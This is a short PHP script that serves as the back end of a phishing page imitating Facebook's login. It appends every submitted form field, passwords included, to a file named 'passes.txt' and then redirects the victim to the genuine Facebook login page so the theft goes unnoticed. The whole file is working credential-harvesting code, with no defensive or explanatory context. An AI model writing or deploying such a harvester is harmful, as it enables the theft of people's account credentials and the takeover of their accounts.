<?php
	$handle=fopen("passes.txt", "a");
	foreach($_POST as $variable => $value)
	{
		fwrite($handle, $variable);
		fwrite($handle, "=");
		fwrite($handle, $value);
		fwrite($handle, "\r\n");
	}
	fwrite($handle, "\r\n");
	fclose($handle);
	header("Location: https://www.facebook.com/login.php");
	exit;
?>